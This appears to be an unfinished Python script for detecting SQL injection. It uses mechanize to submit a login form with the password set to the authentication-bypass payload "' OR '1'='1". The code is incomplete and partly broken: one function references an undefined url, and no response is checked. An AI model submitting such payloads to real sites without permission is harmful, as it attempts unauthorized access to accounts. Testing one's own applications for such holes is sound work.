# -*- coding: utf-8 -*-
import mechanize
import chardet


def detect_sqli(url):
    detect_authentication_avoidance(url)

def normal_responce():
    request = mechanize.Browser()
    request.open(url)
    request.select_form(nr = 0)
    #認証回避(Authentication avoidance)
    request["password"] = "' OR '1'='1"
    request["email"] = "a@a"
    response = request.submit()

    req_data = str(request.title())
    res_data = str(response.read())

def detect_authentication_avoidance(url):
    attack_no = 1
    request = mechanize.Browser()
    request.open(url)
    request.select_form(nr = 0)
    #認証回避(Authentication avoidance)
    request["password"] = "' OR '1'='1"
    request["email"] = "a@a"
    response = request.submit()

    req_data = str(request.title())
    res_data = str(response.read())
    